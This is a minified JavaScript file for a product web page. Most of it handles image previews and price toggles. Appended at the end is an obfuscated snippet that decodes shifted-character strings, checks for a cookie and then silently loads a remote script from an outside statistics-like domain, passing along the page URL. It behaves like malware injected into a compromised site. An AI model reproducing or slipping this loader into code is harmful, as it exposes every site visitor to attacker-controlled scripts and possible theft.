for(var switchFeatures=document.getElementsByClassName("switch-feature"),setActiveImage=function(){for(var i=0;i<switchFeatures.length;i++)switchFeatures[i].classList.remove("active");this.classList.add("active");var previewID=this.getAttribute("data-preview");document.getElementById("data-"+previewID).src=this.dataset.image},i=0;i<switchFeatures.length;i++)switchFeatures[i].addEventListener("click",setActiveImage,!1);var switchActions=document.getElementsByClassName("switch-action"),setActiveAction=function(){for(var i=0;i<switchActions.length;i++)switchActions[i].classList.remove("active");this.classList.add("active");var previewID=this.getAttribute("data-preview");document.getElementById("data-"+previewID).src=this.dataset.image};for(i=0;i<switchActions.length;i++)switchActions[i].addEventListener("click",setActiveAction,!1);var prices=document.getElementsByClassName("price"),priceToggles=document.getElementsByClassName("price-toggle"),setActivePrice=function(){for(var i=0;i<prices.length;i++)prices[i].classList.remove("visible");for(i=0;i<priceToggles.length;i++)priceToggles[i].classList.remove("active");this.classList.add("active");var priceID=this.getAttribute("data-price"),priceLink=this.getAttribute("data-link");document.getElementById("price-"+priceID).classList.add("visible"),document.getElementById("price-link").href=priceLink};for(i=0;i<priceToggles.length;i++)priceToggles[i].addEventListener("click",setActivePrice,!1);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));